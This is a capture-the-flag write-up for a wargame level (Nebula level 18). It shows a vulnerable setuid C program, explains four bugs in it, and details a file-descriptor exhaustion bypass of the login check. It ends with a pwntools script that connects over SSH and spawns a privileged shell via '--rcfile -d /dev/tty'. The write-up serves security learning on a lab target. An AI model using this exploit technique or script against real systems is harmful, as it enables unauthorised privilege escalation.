# Level 18

## Discription

> Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it. \
\
> To do this level, log in as the level18 account with the password level18. Files for this level can be found in /home/flag18.

## Source Code

```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <getopt.h>

struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;

#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile && globals.verbose >= num) \
  fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE "/home/flag18/password"

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, "r");
  if(fp) {
      char file[64];

      if(fgets(file, sizeof(file) - 1, fp) == NULL) {
          dprintf("Unable to read password file %s\n", PWFILE);
          return;
      }
                fclose(fp);
      if(strcmp(pw, file) != 0) return;       
  }
  dprintf("logged in successfully (with%s password file)\n",
      fp == NULL ? "out" : "");
  
  globals.loggedin = 1;

}

void notsupported(char *what)
{
  char *buffer = NULL;
  asprintf(&buffer, "--> [%s] is unsupported at this current time.\n", what);
  dprintf(what);
  free(buffer);
}

void setuser(char *user)
{
  char msg[128];

  sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
  printf("%s\n", msg);

}

int main(int argc, char **argv, char **envp)
{
  char c;

  while((c = getopt(argc, argv, "d:v")) != -1) {
      switch(c) {
          case 'd':
              globals.debugfile = fopen(optarg, "w+");
              if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, 0);
              break;
          case 'v':
              globals.verbose++;
              break;
      }
  }

  dprintf("Starting up. Verbose level = %d\n", globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());
  
  while(1) {
      char line[256];
      char *p, *q;

      q = fgets(line, sizeof(line)-1, stdin);
      if(q == NULL) break;
      p = strchr(line, '\n'); if(p) *p = 0;
      p = strchr(line, '\r'); if(p) *p = 0;

      dvprintf(2, "got [%s] as input\n", line);

      if(strncmp(line, "login", 5) == 0) {
          dvprintf(3, "attempting to login\n");
          login(line + 6);
      } else if(strncmp(line, "logout", 6) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, "shell", 5) == 0) {
          dvprintf(3, "attempting to start shell\n");
          if(globals.loggedin) {
              execve("/bin/sh", argv, envp);
              err(1, "unable to execve");
          }
          dprintf("Permission denied\n");
      } else if(strncmp(line, "logout", 4) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, "closelog", 8) == 0) {
          if(globals.debugfile) fclose(globals.debugfile);
          globals.debugfile = NULL;
      } else if(strncmp(line, "site exec", 9) == 0) {
          notsupported(line + 10);
      } else if(strncmp(line, "setuser", 7) == 0) {
          setuser(line + 8);
      }
  }

  return 0;
}
```

## Solution

This time code is immense and complex. Program takes two arguments `-d` to log data to the provided file and `-v` for verbosity.

```C
int main(int argc, char **argv, char **envp)
{
  char c;

  while((c = getopt(argc, argv, "d:v")) != -1) {
      switch(c) {
          case 'd':
              globals.debugfile = fopen(optarg, "w+");
              if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, 0);
              break;
          case 'v':
              globals.verbose++;
              break;
  }
}
```

We can give different input to program.

- login - tries to read password file, if we have permission to read the file then globals.loggedin  flag will be set to 1.

- logout - it sets globals.loggedin flag to 0. 

- shell - if globals.loggedin is set means if globals.loggedin is 1, it will execute /bin/sh with same arguments we have given to the program.

- closelog - closes the debug file.

- site exec - just print a string.

- setuser - just print a string.

This program can be exploited in 4 ways -

First - setuser function has buffer overflow `msg[128]` but this will be hard to exploit as protections like canary,ASLR,etc. are enabled.

Second - site exec function have format string bug `dprintf(what)` but again we have protections for that too.

Third - we can pass the password file as debug file and we can write to it but program writes `Starting up. Verbose level` string to debug file at first with a new line character which will a create problem.

Fourth - The easiest one,in login function if we don't have permission to read the password file the login function returns back to the main function without closing the password file. So We can exhaust the file descriptors which will fail the program to open password file and will set the login flag.

```c
void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, "r");
  if(fp) {
      char file[64];

      if(fgets(file, sizeof(file) - 1, fp) == NULL) {
          dprintf("Unable to read password file %s\n", PWFILE);
          return;
      }
                fclose(fp);
      if(strcmp(pw, file) != 0) return;       
  }
  dprintf("logged in successfully (with%s password file)\n",
      fp == NULL ? "out" : "");
  
  globals.loggedin = 1;

}
```

So here is the plan, by default a program can open 1024 file descriptors, 3 file descriptors are always open for a program i.e stdin,stdout,stderr. Therefore we have to open 1021 file descriptors so all 1024 file descriptors get utilised, now when the program tries to open password file it will fail and will not enter in `if(fp) { ` condition and will set the globals.loggedin flag and then if we call shell function it should give us /bin/sh but there is a problem, we know that everything is a file in linux, so the program will also fail to open /bin/sh. To solve this problem we have to close one file to open /bin/sh, we have a closelog function to close the debug file.

So the final payload should do -

`1021*login + closelog + shell` 

Here enters another problem `execve("/bin/sh", argv, envp)`, the arguments we pass to the program are passed to /bin/sh also and if we pass -d to our program for debug file then -d will also be passed to /bin/sh and /bin/sh will raise a error that -d is not a valid argument. To solve this problem we have --rcfile argument in bash that is used to execute commands from a particular file. We will pass --rcfile and -d argument to our pogram, /bin/sh will read commands from the file we give after -d argument, we will pass /dev/tty as our file. /dev/tty file is our current terminal. So our program will read command from our terminal.

![](Images/solution.png)

## Python

```python
#!/usr/bin/python3

from pwn import *
from sys import argv,exit

if len(argv) < 2:
	sys.exit(f"{argv[0]} Target_IP") 

level18 = ssh(host=argv[1],user='level18',password='level18')
level18_pro = level18.process(['/home/flag18/flag18','--rcfile','-d','/dev/tty'])
for i in range(1021):
	level18_pro.sendline('login')
level18_pro.sendline('closelog')
level18_pro.sendline('shell')
level18_pro.interactive()
```
